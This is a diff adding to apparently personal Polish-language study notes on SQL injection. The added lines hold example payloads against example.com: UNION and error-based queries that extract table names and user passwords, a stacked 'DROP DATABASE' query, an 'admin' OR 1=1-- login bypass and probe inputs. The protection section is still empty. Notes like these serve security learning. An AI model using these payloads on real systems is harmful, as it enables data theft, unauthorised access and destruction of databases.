@@ -169,7 +169,27 @@ Podatność SQL Injection:
 - wtrzyknięcie UNION-based: https://example.com/search?query=test' UNION SELECT 1,2,3,4,5-- (dla 5 kolumn)
 - Próba wydobycia nazw wszystkich tabel: https://example.com/search?query=test' UNION SELECT null,null,table_name,null,null FROM information_schema.tables--
 - wstrzyknięcie ERROR-based: https://example.com/search?query=test' AND CAST((SELECT blog_user||'/'||user_password FROM blog_users) AS integer)--
-- wstrzyknięcie BLIND (content based): 
+- wstrzyknięcie BLIND (content based)
+- wstrzyknięcie BLIND (time based): Tym razem nie będziemy opierać się na treści odpowiedzi, a na informacji o czasie, jaki zajmuje jej udzielenie
+- STACKED QUERIES: W niektórych konfiguracjach okazuje się to jednak możliwe, np. https://example.com/getCategoryCount?category=test'; DROP DATABASE blog--
+SKUTKI WYKORZYSTANIA SQL INJECTION:
+- Wydobycie dowolnych danych z bazy
+- Omijanie ekranu logowania: W pewnych sytuacjach może się okazać, że wstrzyknięcie SQL pozwoli na ominięcie ekranu logowania bez znajomości danych logujących, np. login: admin' OR 1=1-- hasło: admin1
+- Modyfikacja/usuwanie danych: Zmiana hasła administratora: UPDATE
+- Modyfikacja/usuwanie danych: Ścieżka dostępu (Path Traversal)
+- Modyfikacja/usuwanie danych: Wykonanie kodu PHP
+- Odczyt plików z dysku
+- Zapis plików na dysku
+- Wykonywanie poleceń systemu operacyjnego
+PODSTAWOWE TESTY:
+- Pole liczbowe, np id=1*1, id=2-(SELECT 1 FROM DUAL)
+- Pole zawierające tekst, np name=Jo'||(SELECT 'h' FROM dual)||'n, name=Jo'||'hn
+- Pola zawierające nazwy kolumn do sortowania (np. sort=name), np sort=name/**/, sort=name,(SELECT 1)
+- Mapowanie parametrów na kolumny, np user[city]=Warszawa&user[email]=a@localhost, user[city%3Dcity AND 1%3D2--]=x
+Second-order SQL Injection:
+- sytuacja, w której SQL Injection nie występuje bezpośrednio w odpowiedzi na zapytanie HTTP, ale pewne dane są zapisywane – i dopiero w odpowiedzi na inne zapytanie pojawia się podatność
+METODY OCHRONY PRZED SQL INJECTION:
+- 
 
 ---TODO:
 - modify requests and responses with C# (how?)?
